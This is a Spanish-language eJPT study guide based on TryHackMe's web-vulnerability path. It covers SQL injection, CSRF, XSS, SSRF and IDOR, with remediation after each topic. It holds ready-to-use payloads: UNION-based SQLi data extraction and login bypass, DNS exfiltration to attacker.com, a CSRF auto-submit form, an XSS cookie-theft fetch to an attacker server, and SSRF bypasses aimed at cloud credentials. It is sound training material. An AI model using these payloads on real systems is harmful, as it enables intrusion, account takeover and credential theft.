<h1>
  <img src="https://cdn-images.tryhackme.com/modules/web-application-vulnerabilities-i-1778910743514.svg" width="45px">
  <span> VULNERABILIDADES EN APLICACIONES WEB I</span>
</h1>
 
### *Guía de Referencia y Explotación – Certificación eJPT*

---

> **Estructura del Manual:** Organizado exactamente según el itinerario de estudio de TryHackMe (**Web Application Vulnerabilities I**). Cada sección corresponde a una sala/tema y se subdivide en sus módulos y tareas específicas con todos los títulos y contenidos traducidos al español para facilitar el estudio, la consulta directa en exámenes y la preparación de clases.

---

## 🚀 Matriz de Consulta Rápida (Tabla de Referencia Express)

| Vulnerabilidad | Vector / Dónde Buscar | Payload / Prueba Rápida | Indicador de Éxito |
| :--- | :--- | :--- | :--- |
| **Inyección SQL (SQLi)** | Parámetros URL (`?id=1`), formularios de login, campos de búsqueda. | `'` &#124; `"` &#124; `' OR 1=1;--` &#124; `UNION SELECT 1,2,3--` | Mensajes de error SQL, bypass de login, datos de otras tablas en pantalla. |
| **Falsificación CSRF** | Cambios de estado (email, clave) sin tokens en formularios POST/GET. | Formulario HTML oculto con envío automático JS (`document.forms[0].submit()`). | Cambio de estado realizado sin consentimiento del usuario autenticado. |
| **Scripts Cruzados (XSS)** | Entradas reflejadas en HTML, comentarios, campos de perfil, fragmentos DOM. | `<script>alert('XSS')</script>` &#124; `"><img src=x onerror=alert(1)>` | Ejecución de alerta JavaScript o pop-up en el navegador de la víctima. |
| **Falsificación SSRF** | Parámetros que reciben URLs, imágenes, webhooks, generadores de PDF. | `http://127.0.0.1`, `http://127.1`, `http://169.254.169.254` | Acceso a servicios internos, metadatos cloud de AWS/GCP o conexiones salientes. |
| **Referencias IDOR** | Identificadores en URLs (`?user_id=105`), JSON POST, rutas REST API. | Cambiar ID (`105` $\rightarrow$ `106`), decodificar Base64, probar Técnica de 2 Cuentas. | Visualización o modificación de datos pertenecientes a otro usuario. |

---
<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1779110941603" width="45px">
  <span>Introducción a la Inyección SQL</span>
</h2>


<h3>1.1 Fundamentos de SQL para Inyección</h3>
Antes de profundizar en las técnicas de inyección, es fundamental comprender ciertos bloques de construcción del lenguaje SQL que permiten manipular las consultas de forma avanzada.

Los comentarios en SQL le indican a la base de datos que ignore todo el texto que aparece a continuación en la misma línea. En MySQL se utiliza el doble guión seguido de un espacio (`-- `) o el símbolo de almohadilla (`#`), mientras que los comentarios multilínea utilizan `/* */`. En un ataque, comentar el resto de la consulta es crucial para eliminar la sintaxis posterior que generaría un error de código.

El operador `UNION` combina los resultados de dos o más instrucciones `SELECT` en un único conjunto de respuestas. La regla fundamental es que ambas consultas deben devolver exactamente el mismo número de columnas y con tipos de datos compatibles. Esta técnica permite concatenar una consulta propia para extraer información de tablas distintas.

El operador `LIKE` realiza búsquedas de patrones mediante comodines: el porcentaje (`%`) representa cualquier secuencia de caracteres y el guión bajo (`_`) representa un único carácter. Es una herramienta clave en inyecciones ciegas para adivinar datos carácter por carácter. Por su parte, la cláusula `LIMIT` (sintaxis `LIMIT offset, count`) permite restringir el número de filas devueltas, evitando saturar la pantalla o seleccionando registros específicos.

Las funciones de cadenas facilitan la exfiltración masiva. La función `GROUP_CONCAT()` agrupa valores de múltiples filas en una sola cadena separada por comas, mientras que `CONCAT()` une distintos campos en un único resultado legible, como usuario y contraseña separados por dos puntos.

Por último, la base de datos `information_schema` es el catálogo de metadatos presente en motores como MySQL, MariaDB y PostgreSQL. Destacan dos tablas principales: `information_schema.tables` (que enumera todas las tablas de la base de datos) e `information_schema.columns` (que detalla los nombres de las columnas de cada tabla).

<br>

<h3>1.2 ¿Qué es la Inyección SQL?</h3>


La inyección SQL ocurre cuando una aplicación web toma la entrada proporcionada por el usuario y la concatena directamente dentro de una consulta SQL sin desinfectarla ni parametrizarla adecuadamente. Como resultado, el intérprete de la base de datos trata la entrada del usuario como código ejecutable en lugar de como datos planos.

Las aplicaciones web dinámicas consultan la base de datos constantemente para construir el contenido visualizado. Si el código fuente backend construye una instrucción mediante concatenación directa de cadenas, cualquier carácter especial introducido en los parámetros cambiará la lógica del comando.

Existen tres categorías principales de inyección SQL según la forma en que el atacante recibe la retroalimentación de la base de datos: En Banda (In-Band, donde los datos o errores se muestran directamente en la respuesta HTTP), Ciega (Blind, donde no hay datos explícitos y hay que inferir la información mediante respuestas booleanas o retardos de tiempo) y Fuera de Banda (Out-of-Band, donde se fuerza a la base de datos a enviar los datos a un servidor externo).

Para detectar vulnerabilidades SQLi, el método inicial consiste en inyectar caracteres de prueba como la comilla simple (`'`), la comilla doble (`"`), el comentario (`;--`) o condiciones lógicas (`OR 1=1`) en parámetros de URL, formularios de login, encabezados HTTP o cookies, observando si la aplicación devuelve errores internos o cambia su comportamiento.

<br>

<h3>1.3 Inyección SQL In Band</h3>

La inyección en banda es el tipo más directo y sencillo de explotar porque el mismo canal utilizado para enviar el payload muestra los datos extraídos.

#### Inyección Basada en Errores (Error-Based)
Aprovecha las configuraciones deficientes donde la aplicación expone mensajes de error detallados del motor de base de datos. Estos errores revelan la estructura de la consulta, el tipo de motor utilizado e incluso datos internos cuando se provocan fallos deliberados.

#### Inyección Basada en UNION (Union-Based)
Utiliza el operador `UNION` para adjuntar una consulta `SELECT` secundaria. La metodología de explotación sigue estos pasos secuenciales:

1. **Determinar el número de columnas:** Inyectar `UNION SELECT 1,2,3--` incrementando valores hasta que la página no devuelva un error.
2. **Identificar columnas visibles:** Cambiar el parámetro inicial a un valor inexistente (ejemplo `id=0`) para que la consulta original no devuelva filas y solo se impriman en pantalla los números de la consulta inyectada (`0 UNION SELECT 1,2,3--`).
3. **Extraer el nombre de la base de datos:** Reemplazar el número de la columna visible por la función de sistema (`0 UNION SELECT 1,database(),3--`).
4. **Enumerar tablas:** Consultar la tabla de metadatos (`0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--`).
5. **Enumerar columnas:** Consultar las columnas de la tabla objetivo (`0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--`).
6. **Extraer datos:** Extraer los registros deseados (`0 UNION SELECT 1,group_concat(username,':',password),3 FROM users--`).

<br> 

<h3> 1.4 Inyección SQL Ciega: Anulación de Autenticación </h3>
En la inyección ciega, la aplicación web no muestra resultados de la consulta ni mensajes de error. El bypass de autenticación es el ejemplo más claro: la aplicación únicamente responde si el inicio de sesión fue exitoso o fallido.

Las consultas de autenticación tradicionales verifican si existe un registro que coincida con el usuario y la contraseña proporcionados. Al inyectar una condición que siempre sea verdadera y comentar el resto de la consulta, la base de datos valida la solicitud sin conocer la clave.

```sql
-- Payload inyectado en el campo usuario:
' OR 1=1;--

-- Consulta resultante en el backend:
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='...';
```

Al ser la condición `1=1` siempre verdadera y estar la verificación de contraseña comentada, la base de datos devuelve el primer registro de la tabla (habitualmente la cuenta de administrador), concediendo acceso inmediato.

<br>

<h3> 1.5 Inyección SQL Ciega: Basada en Booleanos y Tiempo</h3>
Cuando se requiere exfiltrar información de una base de datos sin salida visible, se utilizan técnicas ciegas basadas en preguntas de Sí/No.

#### Inyección Ciega Basada en Booleanos
La aplicación devuelve dos estados diferentes según la validez de la condición (por ejemplo, mostrar un mensaje de "usuario existente" versus "no encontrado"). Se inyectan condiciones lógicas combinadas con funciones de cadena e instrucciones `LIKE` para adivinar el nombre de las bases de datos, tablas y valores carácter por carácter.

```sql
-- Probar si el primer carácter empieza por 'a':
admin' AND database() LIKE 'a%
```

#### Inyección Ciega Basada en Tiempo
Se utiliza cuando la respuesta visual de la página es absolutamente idéntica ante cualquier entrada. La única señal disponible es el tiempo que tarda el servidor en responder. Se inyecta la función `SLEEP(5)` en MySQL o `WAITFOR DELAY '0:0:5'` en MSSQL envuelta en una condición lógica. Si la condición es verdadera, el servidor pausará su respuesta durante el tiempo indicado.

```sql
-- Pausa de 5 segundos si la primera letra de la BD es 's':
1' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
```

<br>

<h3>1.6 Inyección SQL Fuera de Banda (Out-of-Band / OOB)</h3>
La inyección fuera de banda se utiliza cuando las técnicas en banda no son posibles y las respuestas ciegas resultan demasiado ruidosas o inestables por latencia de red. Requiere que el servidor de base de datos tenga permisos y capacidad para realizar conexiones salientes a Internet.

En sistemas MySQL sobre Windows, se utiliza la función `LOAD_FILE()` especificando una ruta UNC hacia un servidor DNS o SMB controlado por el atacante. Al intentar resolver el recurso compartido, la base de datos realiza una consulta DNS incluyendo los datos robados dentro del subdominio.

```sql
-- Exfiltración DNS en MySQL vía ruta UNC:
SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\share'));
```

En Microsoft SQL Server (MSSQL), se emplean procedimientos almacenados como `xp_dirtree` para forzar la búsqueda de directorios remotos y activar la resolución DNS, o `xp_cmdshell` (si está habilitado) para ejecutar comandos de sistema operativo como `nslookup` o `curl`.

<br>

<h3>1.7 Remediación y Prevención</h3>
La prevención efectiva de inyección SQL requiere aplicar defensas en profundidad, destacando la separación física del código y los datos.

* **Consultas Preparadas (Sentencias Parametrizadas):** Es la solución definitiva. Se definen marcadores de posición (`?` o `%s`) en la estructura SQL y la base de datos trata los valores de entrada estrictamente como literales de datos, imposibilitando que alteren la lógica de la consulta.
* **Validación de Entrada (Listas de Permitidos):** Comprobar que los datos cumplen con el tipo y formato esperado (por ejemplo, forzar que un parámetro de ID sea exclusivamente numérico).
* **Escapado de Caracteres:** Colocar barras invertidas ante caracteres especiales (`'`). Es una medida frágil que debe evitarse a favor de consultas preparadas.
* **Principio de Mínimo Privilegio:** Configurar la cuenta de base de datos de la web con los permisos mínimos indispensables, impidiendo ejecuciones de comandos de sistema o lectura de esquemas administrativos.
* **Firewalls de Aplicación Web (WAF):** Inspeccionan las peticiones entrantes para bloquear patrones de ataque conocidos, funcionando como una capa de protección complementaria.

---

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1775466711834" width="45px">
  <span>Introducción a CSRF (Falsificación de Solicitudes)</span>
</h2>

### 2.1 ¿Qué es CSRF?
CSRF (Cross-Site Request Forgery) es una vulnerabilidad de control de acceso que engaña al navegador de un usuario autenticado para que ejecute acciones no deseadas en una aplicación web en la que el usuario tiene una sesión activa.

El vector fundamental radica en que los navegadores web adjuntan automáticamente todas las cookies pertenecientes al dominio de destino en cada solicitud saliente, independientemente de la página de origen que haya desencadenado dicha petición. Si una aplicación web confía ciegamente en las cookies para autenticar peticiones que cambian el estado del sistema, un atacante puede forzar la ejecución de acciones en nombre de la víctima.

### 2.2 Requisitos para un Ataque CSRF
Para que una vulnerabilidad CSRF sea explotable, deben cumplirse simultáneamente tres condiciones esenciales en la aplicación web:

1. **Una Acción Relevante / Cambio de Estado:** Debe existir una función que modifique datos sensibles en el servidor, como cambiar la dirección de correo electrónico, restablecer la contraseña, transferir fondos o modificar la configuración del perfil.
2. **Manejo de Sesión Basado en Cookies:** La aplicación autentica las solicitudes únicamente verificando las cookies de sesión adjuntas automáticamente por el navegador.
3. **Ausencia de Parámetros Impredecibles:** Las solicitudes no contienen valores desconocidos para el atacante (como tokens anti-CSRF aleatorios), permitiendo reconstruir la solicitud exacta con parámetros prefijados.

### 2.3 Explotación Rápida con Formulario HTML Oculto
El atacante crea un sitio web malicioso y atrae a la víctima hacia él mediante ingeniería social. Esta página contiene un formulario HTML configurado para apuntar a la URL vulnerable de la aplicación de destino con los datos modificados.

```html
<!-- Prueba de Concepto (PoC) de Ataque CSRF por POST -->
<form action="http://sitio-vulnerable.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>
  // Envío automático al cargar la página
  document.forms[0].submit();
</script>
```

Cuando la víctima abre el enlace, el script de JavaScript envía el formulario en segundo plano. El navegador incluye automáticamente la cookie de sesión legítima de la víctima y el servidor procesa el cambio de correo correctamente.

### 2.4 Remediación y Prevención
* **Tokens Anti-CSRF:** Implementar valores aleatorios, criptográficamente seguros e impredecibles generados por el servidor y asociados a la sesión actual. Cada formulario debe incluir este token en un campo oculto y el servidor debe validarlo estrictamente en cada petición de cambio de estado.
* **Atributos de Cookie `SameSite`:** Configurar las cookies de sesión con `SameSite=Strict` (evita que la cookie se envíe en cualquier petición de origen cruzado) o `SameSite=Lax` (permite el envío solo en navegaciones de nivel superior seguras como enlaces `GET`).
* **Reautenticación:** Solicitar la contraseña actual del usuario antes de confirmar operaciones críticas como cambios de clave o transferencias bancarias.

---

## 3. Introducción a XSS (Scripts en Sitios Cruzados)

### 3.1 ¿Qué es XSS y Causa Raíz?
Cross-Site Scripting (XSS) es una vulnerabilidad de inyección de código que ocurre cuando una aplicación web incluye datos no confiables proporcionados por el usuario dentro del contenido de una página web enviada al navegador, sin haberlos saneado o codificado previamente.

La causa raíz radica en la falta de separación entre el código de renderizado y los datos de entrada. El navegador web no tiene forma de distinguir si una etiqueta `<script>` o un evento HTML proviene del desarrollador legítimo o de una entrada maliciosa introducida por un atacante, por lo que procede a ejecutar el código JavaScript en el contexto de la sesión de la víctima.

### 3.2 Tipos de XSS
* **XSS Reflejado (Reflected):** Ocurre cuando la entrada del usuario se incluye inmediatamente en la respuesta HTTP del servidor sin ser almacenada (por ejemplo, en parámetros de búsqueda de la URL o mensajes de error). Requiere que el atacante distribuya un enlace malicioso preparado a la víctima.
* **XSS Almacenado (Stored / Persistente):** Es la variante más peligrosa. El payload malicioso se guarda permanentemente en la base de datos del servidor (como un comentario en un blog, una reseña de producto o un campo de perfil). Cada vez que cualquier usuario visita la página, el script se ejecuta en su navegador automáticamente.
* **XSS Basado en DOM (DOM-Based):** Se produce cuando el código JavaScript del cliente lee datos de una fuente manipulable por el usuario (denominada *Source*, como `location.search` o `document.referrer`) y los pasa a una función de ejecución o escritura insegura (denominada *Sink*, como `element.innerHTML` o `eval()`), ejecutándose todo en el navegador sin intervención directa del servidor.
* **XSS Ciego (Blind XSS):** Es un tipo de XSS almacenado donde el payload se guarda en una zona administrativa que el atacante no puede visualizar (por ejemplo, un formulario de contacto enviado a un panel interno). El código se ejecuta cuando un administrador o empleado de soporte revisa los datos guardados.

### 3.3 Adaptación a Contextos y Payloads de Explotación
La estructura del payload inyectado debe adaptarse al contexto exacto del código HTML donde la entrada es reflejada:

#### Contexto HTML Plano
```html
<!-- Inyección en texto normal entre etiquetas -->
<script>alert('XSS')</script>
```

#### Contexto de Atributo HTML
```html
<!-- Salir de las comillas del atributovalue y cerrar la etiqueta -->
"> <script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
```

#### Contexto de Bloque Textarea o Título
```html
<!-- Cerrar la etiqueta contenedora previa -->
</textarea><script>alert('XSS')</script>
</title><script>alert('XSS')</script>
```

#### Contexto dentro de Script Existente
```html
<!-- Escapar de la variable JavaScript mediante comillas y punto y coma -->
'; alert('XSS'); //
```

#### Robo de Cookies de Sesión (Payload Realista)
```javascript
fetch('http://servidor-atacante.com/log?cookie=' + btoa(document.cookie));
```

### 3.4 Remediación y Prevención
* **Codificación de Salida (Output Encoding):** Convertir todos los caracteres especiales HTML en sus entidades equivalentes antes de imprimirlos en pantalla (por ejemplo, cambiar `<` por `&lt;`, `>` por `&gt;`, `"` por `&quot;` y `'` por `&#x27;`).
* **Banderas de Cookie `HttpOnly`:** Configurar el atributo `HttpOnly` en las cookies de sesión para impedir que scripts ejecutados por JavaScript mediante `document.cookie` puedan leer las credenciales de acceso.
* **Política de Seguridad de Contenidos (CSP):** Implementar encabezados HTTP de CSP (`Content-Security-Policy`) para restringir los dominios desde los cuales se permite cargar y ejecutar scripts, bloqueando la ejecución de JavaScript en línea (*inline scripts*).

---

## 4. Introducción a SSRF (Falsificación de Solicitudes en el Servidor)

### 4.1 ¿Qué es SSRF y Causa Raíz?
Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante manipular una función de la aplicación web para forzar al servidor backend a realizar peticiones HTTP u otros protocolos hacia direcciones arbitrarias elegidas por el atacante.

La causa raíz es la confianza implícita que tienen los sistemas backend en las peticiones que se originan dentro de su propio perímetro de red. La aplicación recibe un parámetro con una dirección URL (por ejemplo, al importar un perfil mediante avatar, descargar un archivo remoto o consumir un webhook) y realiza la solicitud desde su propia dirección IP sin validar el destino.

### 4.2 Tipos e Impacto en Entornos Cloud
* **SSRF Regular (In-Band):** La respuesta completa del recurso interno solicitado se devuelve y muestra directamente en la interfaz de usuario de la aplicación web.
* **SSRF Ciego (Blind SSRF):** La petición HTTP saliente se realiza con éxito hacia el objetivo, pero la aplicación no devuelve la respuesta en la pantalla. Debe verificarse la vulnerabilidad mediante monitoreo de conexiones recibidas en un servidor controlado externamente (Out-of-Band) o midiendo diferencias en el tiempo de procesamiento.

#### Impacto en la Nube y Redes Internas
El impacto más crítico de SSRF incluye el escaneo de puertos en la red interna, el acceso a servicios locales restringidos (como interfaces administrativas de Redis, Memcached o ElasticSearch sin clave) y el robo de credenciales de infraestructura cloud mediante la API de metadatos accesible en la dirección IP no enrutable `169.254.169.254`:

```bash
# Extracción de metadatos y credenciales IAM en AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 4.3 Técnicas de Elusión y Bypasses de Filtros
Cuando los desarrolladores aplican listas de denegación (*blacklists*) para bloquear `127.0.0.1` o `localhost`, existen múltiples técnicas para eludir las restricciones:

* **Representaciones de IP Equivalentes:**
  * IP abreviada con ceros: `http://127.1` o `http://0`
  * Representación Decimal: `http://2130706433`
  * Representación Octal: `http://0177.0.0.1`
  * Dirección IPv6 local: `http://[::1]` o `http://[0:0:0:0:0:0:0:1]`
* **Dominios DNS Comodín:** Utilizar servicios de resolución DNS pública que apuntan directamente a bucle local, como `http://127.0.0.1.nip.io` o `http://spoofed.burpcollaborator.net`.
* **Credenciales de URL con el Carácter `@`:** Incluir un dominio legítimo antes del símbolo `@` para confundir al validador de cadenas: `https://dominio-permitido.com@127.0.0.1`.
* **Encadenamiento con Redirecciones Abiertas (Open Redirects):** Si el servidor valida que el dominio inicial es de confianza pero sigue redirecciones `302`, apuntar a un script en un servidor de confianza que redirija hacia `http://127.0.0.1`.

### 4.4 Remediación y Prevención
* **Listas de Permitidos (Allow Lists):** Restringir la resolución e interacción de la aplicación únicamente a un conjunto de nombres de dominio y esquemas de red (`http`, `https`) explícitamente autorizados.
* **Deshabilitar el Seguimiento de Redirecciones:** Impedir que el cliente HTTP backend siga automáticamente respuestas `301` o `302` hacia destinos internos no verificados.
* **Validación de Direcciones IP Resolvedoras:** Analizar la dirección IP resultante tras la resolución DNS antes de realizar la petición HTTP final, asegurando que no pertenezca a rangos privados (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`).

---

## 5. Referencias Directas Inseguras a Objetos (IDOR)

### 5.1 ¿Qué es IDOR? Autenticación vs. Autorización
IDOR (Insecure Direct Object Reference) es un tipo de vulnerabilidad de control de acceso a nivel de objeto que ocurre cuando una aplicación utiliza entradas proporcionadas por el usuario para acceder directamente a un recurso o registro en el almacenamiento backend, sin realizar verificaciones suficientes para asegurar que el usuario actual tiene permisos sobre ese recurso.

La distinción clave radica en diferenciar **Autenticación** (mecanismo que comprueba quién es el usuario mediante credenciales de inicio de sesión) de **Autorización** (mecanismo que valida si el usuario autenticado tiene el derecho específico de leer, editar o eliminar un recurso determinado). En un IDOR, el sistema reconoce quién eres, pero no valida si el objeto solicitado te pertenece.

### 5.2 Tipos de Identificadores
Los identificadores directos se presentan bajo distintos formatos según la arquitectura de la aplicación:

* **Identificadores Secuenciales o Numéricos:** Parámetros sencillos como `?user_id=105` o `?invoice=1002`. Son los más vulnerables a ataques de fuerza bruta mediante la modificación secuencial de números.
* **Identificadores Codificados (Base64):** Identificadores como `eyJ1c2VyX2lkIjogNX0=`. Al decodificar la cadena se revela un valor en texto plano (`{"user_id": 5}`), permitiendo alterar la cifra, recodificarla en Base64 y reenviarla.
* **Identificadores Hasheados (MD5 / SHA-1):** Se genera un hash a partir de un entero conocido. Si el usuario detecta que la clave es `md5(100)`, basta con calcular el hash de `101` para intentar acceder al recurso de otra persona.
* **UUIDs e Identificadores Impredecibles:** Cadenas complejas tipo `a1b2c3d4-e5f6-7890-abcd-ef1234567890`. Aunque no son adivinables de forma secuencial, pueden ser vulnerables si la aplicación los expone en otras secciones públicas o mediante la **Técnica de Auditoría de Dos Cuentas** (obtener el UUID del usuario A e intentar consumirlo estando autenticado con la sesión del usuario B).

### 5.3 Ubicaciones de Auditoría durante el Examen o Auditoría
Durante la revisión de una aplicación web, los IDOR deben probarse en todos los puntos donde se intercambien identificadores de recursos:

* **Parámetros en la URL y Rutas REST API:** Peticiones tipo `GET /api/v1/users/105/profile` o `GET /download.php?file=105.pdf`.
* **Cuerpo de Solicitudes POST, PUT o JSON:** Parámetros ocultos en formularios o arreglos de datos como `{"account_id": "105", "balance": 1000}`.
* **Encabezados HTTP y Cookies:** Variables almacenadas en cookies de sesión o encabezados personalizados tipo `X-User-Id: 105`.
* **Minería de Parámetros (Parameter Mining):** Agregar parámetros no mostrados en el diseño gráfico (por ejemplo, añadir `?user_id=1` a una llamada API que normalmente no lo especifica).

### 5.4 Remediación y Prevención
* **Autorización a Nivel de Objeto:** Implementar verificaciones obligatorias en el servidor antes de devolver o modificar un recurso (`SI usuario_actual.id == objeto_solicitado.propietario_id`).
* **Uso de Referencias Indirectas:** Mapear los identificadores reales de la base de datos a claves temporales específicas de la sesión del usuario actual (por ejemplo, mapear la factura real `1005` a la clave local `1` en la sesión activa).
* **Control de Acceso Basado en Roles (RBAC):** Definir políticas centralizadas de permisos para restringir qué roles pueden realizar operaciones de lectura o escritura sobre clases de datos particulares.
